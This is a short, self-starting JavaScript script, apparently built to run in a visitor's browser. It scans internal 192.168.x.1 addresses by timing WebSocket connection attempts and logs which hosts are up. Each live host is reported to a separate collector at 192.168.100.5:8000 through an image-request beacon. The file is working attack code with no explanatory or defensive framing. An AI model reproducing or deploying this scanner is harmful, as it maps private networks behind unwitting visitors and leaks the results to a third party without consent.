var closed_port_max = 2000;
ip = [192,168,0,1];

function stopfor(ms){
  return new Promise( resolve => {
    setTimeout(()=> {resolve("")},ms);
  }) 
}

function scan_network_ws() {
	start_time = (new Date).getTime();
	try {
  	  ws = new WebSocket("ws://" + ip.join("."));
    	setTimeout("check_ns_ws()", 100);
	} catch (err) {
    	return;
	}
}

function check_ns_ws() {
    var interval = (new Date).getTime() - start_time;
    if (ws.readyState == 0) {
        if (interval > closed_port_max) {
            console.log(ip.join(".") + "%c Host is down.",'color:red');
        } else {
            setTimeout("check_ns_ws()", 100);
        }
    } else {
        console.log(ip.join(".") + "%c Host is Up.",'color:green');
        new Image().src = "http://192.168.100.5:8000/?ip_IsUp=" + ip.join(".");
    };
}


async function go(){
  for(let i=95; i<105; i++){
    scan_network_ws();
    await stopfor(2100);
    ip[2] = i;
  }
}

go();